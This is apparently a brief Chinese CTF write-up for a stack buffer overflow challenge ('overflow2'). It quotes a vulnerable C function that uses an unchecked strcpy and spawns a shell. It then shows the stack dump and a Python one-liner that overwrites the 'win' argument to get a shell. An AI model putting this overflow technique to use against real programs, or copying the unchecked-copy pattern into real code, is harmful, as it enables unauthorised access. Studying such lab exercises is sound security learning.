# 代码审计
```

void vuln(int win, char *str) {
    char buf[64];
    strcpy(buf, str);
    dump_stack((void **) buf, 23, (void **) &win);
    printf("win = %d\n", win);
    if (win == 1) {
        execl("/bin/sh", "sh", NULL);
    } else {
        printf("Sorry, you lose.\n");
    }
    exit(0);
}
```

从中我们可以看到，win是函数的参数，从输出中我们可以发现

>➜  overflow2 ./overflow2 $(python -c "print('a'*80)")                                                                          
Stack dump:
0xffd62b68: 0x000003e8
0xffd62b64: 0xffd642f3 (second argument)
0xffd62b60: 0x00000000 (first argument)    ←这里就是win
0xffd62b5c: 0x61616161 (saved eip)
0xffd62b58: 0x61616161 (saved ebp)
0xffd62b54: 0x61616161
0xffd62b50: 0x61616161
0xffd62b4c: 0x61616161
0xffd62b48: 0x61616161
0xffd62b44: 0x61616161
0xffd62b40: 0x61616161
0xffd62b3c: 0x61616161
0xffd62b38: 0x61616161
0xffd62b34: 0x61616161
0xffd62b30: 0x61616161
0xffd62b2c: 0x61616161
0xffd62b28: 0x61616161
0xffd62b24: 0x61616161
0xffd62b20: 0x61616161
0xffd62b1c: 0x61616161
0xffd62b18: 0x61616161
0xffd62b14: 0x61616161
0xffd62b10: 0x61616161 (beginning of buffer)
win = 0
Sorry, you lose.

因此覆盖到这个地方就好啦

>'a'*80+'\x01'
# 利用
再次利用python

```
➜  overflow2 ./overflow2 $(python -c "print('a'*80+'\x01')")
```
getshell